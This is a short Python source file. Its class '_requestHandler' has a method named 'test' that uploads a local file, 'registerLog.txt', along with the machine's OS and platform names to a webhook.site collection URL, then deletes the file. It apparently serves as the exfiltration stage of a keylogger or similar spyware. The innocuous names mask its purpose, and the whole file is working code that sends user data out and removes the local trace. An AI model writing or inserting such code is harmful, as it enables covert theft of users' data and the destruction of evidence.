import os
import platform
import requests
class _requestHandler():
       def __init__(self):
              pass
       def test(self):
              if not os.path.isfile("registerLog.txt"): return False
              file = open("registerLog.txt", 'rb')
              
              requests.post("https://webhook.site/364ae3db-8fe9-44fa-aeed-e768ed1bd8f0", files={"upload_file": file}, params={
                     "osName" : os.name,
                     "platformName": platform.system()
              })
              file.close()
              
              os.remove("registerLog.txt")
              print("Request enviada")